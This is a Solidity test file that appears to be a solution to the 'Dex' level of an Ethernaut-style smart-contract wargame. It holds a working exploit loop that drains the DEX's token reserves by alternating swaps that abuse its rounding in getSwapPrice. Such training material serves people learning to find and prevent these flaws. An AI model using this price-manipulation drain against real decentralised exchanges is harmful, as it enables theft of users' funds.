// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/Dex/DexFactory.sol";
import "../src/levels/Dex/Dex.sol";
import "./BaseTest.sol";

contract DexTest is BaseTest {
    DexFactory dexFactory;

    function setUp() public {
        dexFactory = new DexFactory();
        super.setUp(dexFactory);
    }

    function testIsDexCleared() public testWrapper(dexFactory, 0) {
        Dex dex = Dex(instance);

        address[2] memory tokens = [dex.token1(), dex.token2()];
        dex.approve(instance, 500);

        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;
        uint256 fromIndex = 0;
        uint256 toIndex = 1;

        while (true) {
            hackBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(eoa),
                SwappableToken(tokens[toIndex]).balanceOf(eoa)
            ];

            dexBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(dex)),
                SwappableToken(tokens[toIndex]).balanceOf(address(dex))
            ];

            uint256 swapPrice = dex.getSwapPrice(
                tokens[fromIndex],
                tokens[toIndex],
                hackBalances[0]
            );
            if (swapPrice > dexBalances[1]) {
                dex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            } else {
                dex.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }
            // reverse indexes
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }
    }
}
